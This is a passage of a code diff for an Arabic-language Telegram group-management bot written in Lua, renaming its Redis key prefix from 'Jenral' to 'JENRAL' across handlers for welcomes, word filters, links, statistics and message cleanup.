+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:Id:Photo'..msg.chat_id_)
 end end
 if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
-if DevALI:get(Jenral..'ALI:Lock:Id:Photo'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Id:Photo'..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
 else
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الايدي بالصوره'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:Id:Photo'..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الايدي بالصوره'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:Id:Photo'..msg.chat_id_,true)
 end end 
 
 if text and text == 'تفعيل الايدي' and ChCheck(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Id'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Id'..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد مفعل ', 1, 'md')
 else
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الايدي بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:Id'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الايدي بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:Id'..msg.chat_id_)
 end end 
 if text and text == 'تعطيل الايدي' and ChCheck(msg) then
-if DevALI:get(Jenral..'ALI:Lock:Id'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Id'..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد معطل ', 1, 'md')
 else
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الايدي بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:Id'..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الايدي بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:Id'..msg.chat_id_,true)
 end end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
-DevALI:setex(Jenral.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
+DevALI:setex(JENRAL.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
 end
 if text == 'انشاء رابط' or text == 'انشاء الرابط' then
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
-if not DevALI:get(Jenral.."ALI:Groups:Links"..msg.chat_id_)  then 
+if not DevALI:get(JENRAL.."ALI:Groups:Links"..msg.chat_id_)  then 
 if LinkGp.ok == true then 
 LinkGroup = LinkGp.result
-DevALI:set(Jenral.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevALI:set(JENRAL.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
 end
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
-DevALI:setex(Jenral.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
+DevALI:setex(JENRAL.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الترحيب بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral.."ALI:Lock:Welcome"..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الترحيب بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Lock:Welcome"..msg.chat_id_,true)
 end
 if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الترحيب بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral.."ALI:Lock:Welcome"..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الترحيب بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Lock:Welcome"..msg.chat_id_)
 end
-if DevALI:get(Jenral..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
+if DevALI:get(JENRAL..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
-DevALI:del(Jenral..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-DevALI:del(Jenral..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
 Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
-DevALI:set(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_,Welcomes)
+DevALI:set(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_,Welcomes)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الترحيب', 1, 'md')
 return false   
 end
 if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الترحيب الان\n⌁︙تستطيع اضافة مايلي ↫ ⤈\n⌁︙دالة عرض الاسم ↫ firstname\n⌁︙دالة عرض المعرف ↫ username', 1, 'md')
-DevALI:set(Jenral..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevALI:set(JENRAL..'ALI:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
 if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الترحيب")  
-DevALI:del(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_)
 end
 if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
-local Welcomes = DevALI:get(Jenral..'ALI:Groups:Welcomes'..msg.chat_id_)
+local Welcomes = DevALI:get(JENRAL..'ALI:Groups:Welcomes'..msg.chat_id_)
 if Welcomes then
 Dev_ALI(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم وضع الترحيب \n⌁︙ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
 end
 end
---     Source Jenral     --
-if DevALI:get(Jenral..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
+--     Source JENRAL     --
+if DevALI:get(JENRAL..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
 if text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء حفظ الوصف", 1, 'md')
-DevALI:del(Jenral..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-DevALI:del(Jenral..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
 https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير وصف المجموعه', 1, 'md')
 return false  
 end 
 if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
-DevALI:set(Jenral..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevALI:set(JENRAL..'ALI:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الوصف الان', 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
-DevALI:set(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
+DevALI:set(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
 return false  
 end    
-if DevALI:get(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
+if DevALI:get(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
 if text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر المنع', 1, 'md')
-DevALI:del(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevALI:del(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 return false  
 end   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم منع الكلمه ↫ "..text, 1, 'html')
-DevALI:del(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
-DevALI:hset(Jenral..'ALI:Filters:'..msg.chat_id_, text,'newword')
+DevALI:del(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevALI:hset(JENRAL..'ALI:Filters:'..msg.chat_id_, text,'newword')
 return false
 end
 if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
-DevALI:set(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
+DevALI:set(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
 return false  
 end    
-if DevALI:get(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
+if DevALI:get(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
 if text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الغاء المنع', 1, 'md')
-DevALI:del(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevALI:del(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 return false  
 end   
-if not DevALI:hget(Jenral..'ALI:Filters:'..msg.chat_id_, text) then  
+if not DevALI:hget(JENRAL..'ALI:Filters:'..msg.chat_id_, text) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
-DevALI:del(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevALI:del(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 else
-DevALI:hdel(Jenral..'ALI:Filters:'..msg.chat_id_, text)
+DevALI:hdel(JENRAL..'ALI:Filters:'..msg.chat_id_, text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
-DevALI:del(Jenral.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevALI:del(JENRAL.."ALI:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 end
 return false
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if SudoBot(msg) then
 if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫ الاحصائيات ⌁" then
-local gps = DevALI:scard(Jenral.."ALI:Groups") local users = DevALI:scard(Jenral.."ALI:Users") 
+local gps = DevALI:scard(JENRAL.."ALI:Groups") local users = DevALI:scard(JENRAL.."ALI:Users") 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙احصائيات البوت ↫ ⤈\n⌁︙عدد المشتركين ↫ ❨ '..users..' ❩\n⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
 end
 if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ⌁" then
-local users = DevALI:scard(Jenral.."ALI:Users")
+local users = DevALI:scard(JENRAL.."ALI:Users")
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
 end
 if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ⌁" then
-local gps = DevALI:scard(Jenral.."ALI:Groups")
+local gps = DevALI:scard(JENRAL.."ALI:Groups")
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
-if not DevALI:get(Jenral..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
+if not DevALI:get(JENRAL..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
 local Number = tonumber(text:match('^تنظيف (%d+)$')) 
 if Number > 1000 then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
@@ -7495,11 +7483,11 @@ DeleteMessage(msg.chat_id_,{[0]=Message})
 Message = Message - 1048576 
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
-DevALI:setex(Jenral..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
+DevALI:setex(JENRAL..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
 end 
 end
 if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) then 
-local pv = DevALI:smembers(Jenral.."ALI:Users")
+local pv = DevALI:smembers(JENRAL.."ALI:Users")
 local sendok = 0
 for i = 1, #pv do
 tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
@@ -7508,7 +7496,7 @@ chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100}
 },function(arg,data) 
 if data.ID and data.ID == "Ok" then
 else
-DevALI:srem(Jenral.."ALI:Users",pv[i])
+DevALI:srem(JENRAL.."ALI:Users",pv[i])
 sendok = sendok + 1
 end
 if #pv == i then 
@@ -7524,63 +7512,63 @@ end,nil)
 end
 return false
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) then 
-local group = DevALI:smembers(Jenral.."ALI:Groups")
+local group = DevALI:smembers(JENRAL.."ALI:Groups")
 local w = 0
 local q = 0
 for i = 1, #group do
 tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
-DevALI:srem(Jenral.."ALI:Groups",group[i]) 
-tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = Jenral, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
+DevALI:srem(JENRAL.."ALI:Groups",group[i]) 
+tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = JENRAL, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
 w = w + 1
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-DevALI:srem(Jenral.."ALI:Groups",group[i]) 
+DevALI:srem(JENRAL.."ALI:Groups",group[i]) 
 q = q + 1
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
-DevALI:srem(Jenral.."ALI:Groups",group[i]) 
+DevALI:srem(JENRAL.."ALI:Groups",group[i]) 
 q = q + 1
 end
 if data and data.code_ and data.code_ == 400 then
-DevALI:srem(Jenral.."ALI:Groups",group[i]) 
+DevALI:srem(JENRAL.."ALI:Groups",group[i]) 
 w = w + 1
 end
 if #group == i then 
 if (w + q) == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙*لاتوجد مجموعات وهميه*', 1, 'md')   
 else
-local Jenralgp2 = (w + q)
-local Jenralgp3 = #group - Jenralgp2
+local JENRALgp2 = (w + q)
+local JENRALgp3 = #group - JENRALgp2
 if q == 0 then
-Jenralgp2 = ''
+JENRALgp2 = ''
 else
-Jenralgp2 = '\n⌁︙تم حذف ↫ { '..q..' } مجموعه من البوت'
+JENRALgp2 = '\n⌁︙تم حذف ↫ { '..q..' } مجموعه من البوت'
 end
 if w == 0 then
-Jenralgp1 = ''
+JENRALgp1 = ''
 else
-Jenralgp1 = '\n⌁︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
+JENRALgp1 = '\n⌁︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
 end
-Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙عدد الكروبات الان ↫ { '..#group..' }'..Jenralgp1..Jenralgp2..'\n⌁︙العدد الحقيقي الان  ↫ ( '..Jenralgp3..' ) \n ', 1, 'md')
+Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙عدد الكروبات الان ↫ { '..#group..' }'..JENRALgp1..JENRALgp2..'\n⌁︙العدد الحقيقي الان  ↫ ( '..JENRALgp3..' ) \n ', 1, 'md')
 end end
 end,nil)
 end
 return false
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == "تفعيل امسح" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امسح مع ميزة الحذف التلقائي للميديا'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:Clean'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امسح مع ميزة الحذف التلقائي للميديا'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:Clean'..msg.chat_id_,true)  
 end
 if text and (text == "تعطيل امسح" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امسح مع ميزة الحذف التلقائي للميديا'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:Clean'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امسح مع ميزة الحذف التلقائي للميديا'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:Clean'..msg.chat_id_) 
 end
 if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$")) and Constructor(msg) then   
 local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$")
@@ -7588,12 +7576,12 @@ if tonumber(Num) < 50 or tonumber(Num) > 200 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 50 واصغر من 200 للحذف التلقائي', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
-DevALI:set(Jenral..'ALI:CleanNum'..msg.chat_id_,Num) 
+DevALI:set(JENRAL..'ALI:CleanNum'..msg.chat_id_,Num) 
 end end 
-if msg and DevALI:get(Jenral..'ALI:Lock:Clean'..msg.chat_id_) then
-if DevALI:get(Jenral..'ALI:CleanNum'..msg.chat_id_) then CleanNum = DevALI:get(Jenral..'ALI:CleanNum'..msg.chat_id_) else CleanNum = 200 end
-if DevALI:scard(Jenral.."ALI:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
-local List = DevALI:smembers(Jenral.."ALI:cleaner"..msg.chat_id_)
+if msg and DevALI:get(JENRAL..'ALI:Lock:Clean'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:CleanNum'..msg.chat_id_) then CleanNum = DevALI:get(JENRAL..'ALI:CleanNum'..msg.chat_id_) else CleanNum = 200 end
+if DevALI:scard(JENRAL.."ALI:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
+local List = DevALI:smembers(JENRAL.."ALI:cleaner"..msg.chat_id_)
 local Del = 0
 for k,v in pairs(List) do
 Del = (Del + 1)
@@ -7601,20 +7589,20 @@ local Message = v
 DeleteMessage(msg.chat_id_,{[0]=Message})
 end
 SendText(msg.chat_id_,"⌁︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
-DevALI:del(Jenral.."ALI:cleaner"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:cleaner"..msg.chat_id_)
 end 
 end 
 if Cleaner(msg) then
-if DevALI:get(Jenral..'ALI:Lock:Clean'..msg.chat_id_) then 
+if DevALI:get(JENRAL..'ALI:Lock:Clean'..msg.chat_id_) then 
 if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
-local M = DevALI:scard(Jenral.."ALI:cleaner"..msg.chat_id_)
+local M = DevALI:scard(JENRAL.."ALI:cleaner"..msg.chat_id_)
 if M ~= 0 then
-Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد الميديا ↫ "..M.."\n⌁︙الحذف التلقائي ↫ "..(DevALI:get(Jenral..'ALI:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
+Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد الميديا ↫ "..M.."\n⌁︙الحذف التلقائي ↫ "..(DevALI:get(JENRAL..'ALI:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
 end end
 if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
-local List = DevALI:smembers(Jenral.."ALI:cleaner"..msg.chat_id_)
+local List = DevALI:smembers(JENRAL.."ALI:cleaner"..msg.chat_id_)
 local Del = 0
 for k,v in pairs(List) do
 Del = (Del + 1)
@@ -7623,13 +7611,13 @@ DeleteMessage(msg.chat_id_,{[0]=Message})
 end
 if Del ~= 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف "..Del.." من الميديا", 1, 'md') 
-DevALI:del(Jenral.."ALI:cleaner"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:cleaner"..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
 end end 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
 ALI_Del = {[0]= msg.id_}
@@ -7651,459 +7639,459 @@ DeleteMessage(msg.chat_id_,ALI_Del2)
 end,nil)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if Admin(msg) then
 if text and text:match("^فتح (.*)$") then
 local UnLockText = {string.match(text, "^(فتح) (.*)$")}
 if UnLockText[2] == "التعديل" then
-if DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التعديل")  
-DevALI:del(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
-if DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح تعديل الميديا")  
-DevALI:del(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفارسيه" then
-if DevALI:get(Jenral..'ALI:Lock:Farsi'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Farsi'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفارسيه")  
-DevALI:del(Jenral..'ALI:Lock:Farsi'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Farsi'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفشار" then
-if not DevALI:get(Jenral..'ALI:Lock:Fshar'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفشار")  
-DevALI:set(Jenral..'ALI:Lock:Fshar'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_,true)
 else
